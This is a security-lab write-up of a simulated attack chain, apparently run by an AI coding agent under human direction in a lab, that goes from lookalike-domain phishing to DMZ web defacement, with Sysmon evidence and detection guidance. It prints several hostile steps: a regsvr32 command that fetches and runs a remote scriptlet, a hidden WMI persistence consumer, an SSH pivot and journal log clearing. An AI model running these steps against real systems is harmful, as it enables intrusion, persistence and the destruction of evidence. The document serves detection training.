# AGC-079 — Full Attack Chain: DMZ Pivot to External Defacement

> **Disclosure:** Executed & documented by Claude Code under direction and review by Hasan.

## Card

| Field | Value |
|---|---|
| ID | `AGC-079` |
| Title | Full Attack Chain: DMZ Pivot to External Defacement |
| Category | `13-full-attack-chain` — Full Attack Chain |
| Severity | Critical |
| MITRE Technique | T1566.002, T1218.010, T1546.003, T1552.001, T1021.004, T1548.003, T1571, T1005, T1070.002, T1491.002 |
| Verdict | True Positive |
| Confidence | High |
| Chain | ◀ [AGC-078](../AGC-078-full-chain-trusted-access-to-gpo-impact/README.md) · next [AGC-080](../AGC-080-full-chain-discovery-to-service-disruption/README.md) ▶ |

## Attacker Perspective

### Simulation

10-phase cross-environment attack chain spanning a Windows endpoint (COMPROMISED-HOST-01) and a Linux DMZ host (EXT-ATTACKER-SIM standing in for DMZ-LINUX-01, whose Guest Additions are broken). It opens with credential phishing off a lookalike domain, moves through proxy execution and WMI persistence, pivots to the DMZ on discovered SSH credentials, and ends in web defacement.

**Windows phases** (00:15:18 - 00:16:28 UTC): Phases 1-4 on COMPROMISED-HOST-01
**Linux phases** (00:17:59 - 00:18:08 UTC): Phases 5-10 on EXT-ATTACKER-SIM
**Total execution window**: ~3 minutes across both hosts

## SOC Perspective

### Detection

Composite alert: Sysmon EID 22 DNS query for lookalike domain `ashford-grove-support.local` resolving to external IP 10.10.40.10, followed by WMI Event Subscription creation (EID 19/20/21) and network connections to the same external host. Cross-environment pivot chain ending in web defacement.

### Investigation

#### Phase 1: Initial Access — Lookalike Domain Phishing (T1566.002)

Attacker registered `ashford-grove-support.local` (typosquat of legitimate `ashfordgrove.local`) and hosted a credential-harvesting portal on 10.10.40.10.

**Sysmon EID 22 — DNS Query:**
```
UtcTime: 2026-09-16 00:15:08.315
ProcessId: 3028
QueryName: ashford-grove-support.local
QueryStatus: 0
QueryResults: 10.10.40.10;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: COMPROMISED-01\Administrator
```

**Sysmon EID 3 — Network Connection (HTTP GET to phishing portal):**
```
UtcTime: 2026-09-16 00:15:08.367
ProcessId: 3028
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Protocol: tcp
Initiated: true
SourceIp: 10.10.10.103
SourcePort: 65387
DestinationIp: 10.10.40.10
DestinationPort: 80
```

**Sysmon EID 3 — Network Connection (HTTP POST with credentials):**
```
UtcTime: 2026-09-16 00:15:08.386
ProcessId: 3028
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Protocol: tcp
Initiated: true
SourceIp: 10.10.10.103
SourcePort: 65388
DestinationIp: 10.10.40.10
DestinationPort: 80
```

HTTP GET returned 1446 bytes (phishing portal page "Acme Corp Portal"). POST submitted `michael.chen@ashfordgrove.local` credentials to the lookalike domain.

#### Phase 2: Execution — Regsvr32 Proxy Execution (T1218.010)

Attempted `regsvr32.exe /s /n /u /i:http://10.10.40.10/stage2.sct scrobj.dll` to download and execute a scriptlet via signed Windows binary.

**Result**: Access denied by Windows Defender/SmartScreen. The block landed before process creation, so no Sysmon EID 1 fired for regsvr32.exe. On a host with weaker endpoint protection, this would produce EID 1 with the full command line and EID 3 for the HTTP fetch of the .sct file.

**Lab constraint**: Windows 11 Tamper Protection + Defender blocked the regsvr32 proxy execution. The technique is documented as attempted-and-blocked.

#### Phase 3: Persistence — WMI Event Subscription (T1546.003)

Created a three-component WMI persistence mechanism:

**Sysmon EID 19 — WMI Event Filter Created:**
```
UtcTime: 2026-09-16 00:15:24.974
Operation: Created
User: COMPROMISED-01\Administrator
EventNamespace: "root\cimv2"
Name: "AGC079UpdateFilter"
Query: "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

**Sysmon EID 20 — WMI Event Consumer Created:**
```
UtcTime: 2026-09-16 00:15:25.129
Operation: Created
User: COMPROMISED-01\Administrator
Name: "AGC079UpdateConsumer"
Type: Command Line
Destination: "powershell.exe -WindowStyle Hidden -File C:\Windows\Temp\agc079-stage2.ps1"
```

**Sysmon EID 21 — WMI Binding Created:**
```
UtcTime: 2026-09-16 00:16:00.157
Operation: Created
User: COMPROMISED-01\Administrator
Consumer: "\\.\ROOT\subscription:CommandLineEventConsumer.Name=\"AGC079UpdateConsumer\""
Filter: "\\.\ROOT\subscription:__EventFilter.Name=\"AGC079UpdateFilter\""
```

The WMI subscription fires every 60 seconds when `Win32_PerfFormattedData_PerfOS_System` changes — that is, almost always — running a hidden PowerShell script with no payload on disk.

#### Phase 4: Credential Access — Credentials in Files (T1552.001)

Planted and discovered a maintenance script containing SSH credentials for DMZ access:

**Sysmon EID 1 — Directory Enumeration:**
```
UtcTime: 2026-09-16 00:16:03.218
ProcessId: 2152
Image: C:\Windows\System32\cmd.exe
CommandLine: "C:\WINDOWS\system32\cmd.exe" /c "dir /s /b C:\Scripts\*.ps1 C:\Scripts\*key*"
```

Discovered files:
- `C:\Scripts\dmz-maintenance.ps1` — contains SSH connection details (user: dmzadmin, host: 10.10.20.10)
- `C:\Scripts\dmz_maint_key` — OpenSSH private key for DMZ access

**Note**: This is the weakest phase in the chain. The find depends on the attacker stumbling on an existing maintenance script, which is circumstantial. In production, an analyst would need more context to tell whether the script was planted or a real operational artifact.

#### Phase 5: Lateral Movement — SSH Pivot (T1021.004)

Using credentials discovered in Phase 4, the attacker pivots to the DMZ host via SSH.

**Lab constraint**: DMZ-LINUX-01 Guest Additions are broken (RunLevel=0), so this phase was executed on EXT-ATTACKER-SIM as a substitute. The equivalent command would be `ssh -i dmz_maint_key dmzadmin@10.10.20.10`.

In production, evidence would include:
- auth.log entries showing SSH login from 10.10.10.103
- Wazuh FIM alerts for SSH key usage
- OPNsense firewall logs showing cross-zone traffic (Corporate -> DMZ)

#### Phase 6: Privilege Escalation — Sudo Abuse (T1548.003)

Demonstrated NOPASSWD sudo escalation on the DMZ host:

```
Current user: kaliadmin
Sudo check: uid=0(root) gid=0(root) groups=0(root)
Sudoers entry: kaliadmin ALL=(ALL) NOPASSWD:ALL
```

The NOPASSWD sudoers entry allows immediate privilege escalation without password challenge — a common misconfiguration in DMZ hosts where automated maintenance scripts require root access.

#### Phase 7: Command and Control — Non-Standard Port (T1571)

Attempted C2 beaconing on port 8443 (non-standard HTTPS alternative):

```
[2026-09-16 00:17:59.720] Beacon 1: [Errno 111] Connection refused
[2026-09-16 00:18:01.720] Beacon 2: [Errno 111] Connection refused
[2026-09-16 00:18:03.721] Beacon 3: [Errno 111] Connection refused
```

Three beacon attempts at 2-second intervals to localhost:8443. Connection refused indicates no listener was running — in a real attack, a C2 implant would listen on this port. The non-standard port choice (8443 vs 443) is designed to bypass firewall rules that only inspect standard ports.

#### Phase 8: Collection — Local System Data (T1005)

Collected sensitive system data and web server configuration:

```
Archive: /tmp/dmz_collect.tar.gz (740 bytes)
Contents: passwd, webroot listing, nginx config
```

Files collected:
- `/etc/passwd` — user account enumeration
- `/var/www/html/` directory listing — webroot contents
- `/etc/nginx/nginx.conf` — web server configuration (for identifying upload paths, enabled sites, SSL certificates)

#### Phase 9: Defense Evasion — Clear Linux Logs (T1070.002)

Attempted log clearing to cover tracks:

```
auth.log: No such file or directory (Kali uses journald)
Vacuuming done, freed 0B of archived journals from /run/log/journal.
Deleted archived journal: system@...journal (4.2M)
Deleted archived journal: user-1000@...journal (3.6M)
```

**Lab constraint**: Kali Linux (EXT-ATTACKER-SIM substitute) uses journald rather than syslog, so `/var/log/auth.log` does not exist. The journald vacuum successfully deleted 7.8MB of archived journal entries. In production on a Debian/Ubuntu DMZ host, this would truncate auth.log and syslog, destroying SSH login evidence from Phase 5.

#### Phase 10: Impact — External Web Defacement (T1491.002)

Overwrote the web server's index page:

```
New content: <html><body><h1>HACKED BY AGC-079 -- Lab Simulation</h1><p>DMZ Pivot Chain Complete</p></body></html>
```

The original "Acme Corp Portal" page on EXT-ATTACKER-SIM's port 80 was replaced with a defacement page. In production, this would be visible to all external visitors and would trigger:
- Wazuh FIM alert on `/var/www/html/index.html` modification
- Content integrity monitoring alerts
- External availability monitoring (content mismatch)

### Report

AGC-079 starts with social engineering on a Windows endpoint and ends with DMZ web defacement. It crosses two network zones, Corporate and DMZ, with the discovered SSH credentials as the pivot between them.

**Confidence is High (not Critical)** because Phase 4 (credential discovery) represents the weakest evidential link in the chain — the credential file discovery is circumstantial and in production would require additional context to determine if the maintenance script was pre-existing or attacker-planted. All other phases have strong evidential support.

**Cross-reference**: This scenario builds upon techniques from AGC-074 (DMZ defacement), AGC-077 (credential harvest chain), and AGC-001 (phishing initial access). The WMI persistence pattern mirrors AGC-026 (WMI event subscription persistence).

### MITRE Mapping

| Technique ID | Name                           | Tactic              | Confidence |
|-------------|--------------------------------|----------------------|------------|
| T1566.002   | Spearphishing Link             | Initial Access       | Critical   |
| T1218.010   | Regsvr32                       | Defense Evasion      | Medium     |
| T1546.003   | WMI Event Subscription         | Persistence          | Critical   |
| T1552.001   | Credentials in Files           | Credential Access    | High       |
| T1021.004   | SSH                            | Lateral Movement     | High       |
| T1548.003   | Sudo and Sudo Caching          | Privilege Escalation | Critical   |
| T1571       | Non-Standard Port              | Command and Control  | Medium     |
| T1005       | Data from Local System         | Collection           | High       |
| T1070.002   | Clear Linux or Mac System Logs | Defense Evasion      | Critical   |
| T1491.002   | External Defacement            | Impact               | Critical   |

## Attacker vs Analyst Timeline

| Time (UTC)          | Attacker Phase                    | Analyst Detection Opportunity                       |
|---------------------|-----------------------------------|-----------------------------------------------------|
| 00:15:08            | DNS query to lookalike domain     | EID 22: anomalous domain similar to corporate name  |
| 00:15:08            | HTTP GET/POST credential harvest  | EID 3: outbound HTTP to known-bad IP                |
| 00:15:21            | Regsvr32 proxy execution attempt  | Defender block event; endpoint alert                 |
| 00:15:24 - 00:16:00 | WMI persistence created           | EID 19/20/21: WMI subscription triad                |
| 00:16:03            | Credential file discovery         | EID 1: cmd.exe dir enumeration of scripts           |
| 00:17:59            | SSH pivot to DMZ                  | auth.log + firewall logs (cross-zone SSH)           |
| 00:17:59            | Sudo escalation                   | sudo audit log entries                              |
| 00:18:00            | C2 beaconing on port 8443         | Network monitoring: non-standard port traffic       |
| 00:18:05            | System data collection + tar      | Process monitoring: tar archiving sensitive files    |
| 00:18:05            | Log clearing (journald vacuum)    | Log volume anomaly; gap in auth records             |
| 00:18:06            | Web defacement                    | FIM alert; content integrity check failure          |

**Analysis gap**: The ~2-minute gap between Windows-side completion (00:16:28) and Linux-side start (00:17:59) is an artifact of sequential lab execution. In a real attack, the SSH pivot would occur immediately after credential discovery.

## Mock Escalation

**To**: SOC L2 / Incident Response
**Priority**: P1 — Active Multi-Host Compromise with Public Impact
**Summary**: A 10-phase attack chain originating from COMPROMISED-HOST-01 (michael.chen) has pivoted from the corporate network to the DMZ and defaced an externally-facing web application.

**Key findings**:
1. Credential harvesting via lookalike domain `ashford-grove-support.local`
2. WMI fileless persistence established on COMPROMISED-HOST-01
3. SSH private key for DMZ access found in cleartext maintenance script
4. Attacker achieved root access on DMZ host via NOPASSWD sudo
5. Sensitive system data (passwd, nginx config) exfiltrated via tar archive
6. Journal logs cleared to destroy evidence trail
7. External web defacement visible to public

**Recommended immediate actions**:
1. Isolate COMPROMISED-HOST-01 from network
2. Restore DMZ web content from known-good backup
3. Rotate SSH keys for all DMZ service accounts
4. Audit and restrict NOPASSWD sudo entries on all DMZ hosts
5. Block DNS resolution for `ashford-grove-support.local` at firewall
6. Review all WMI subscriptions across Windows endpoints

## Evidence

Screenshots: none in phase one (text evidence only); added when this scenario is re-executed by hand in phase two.
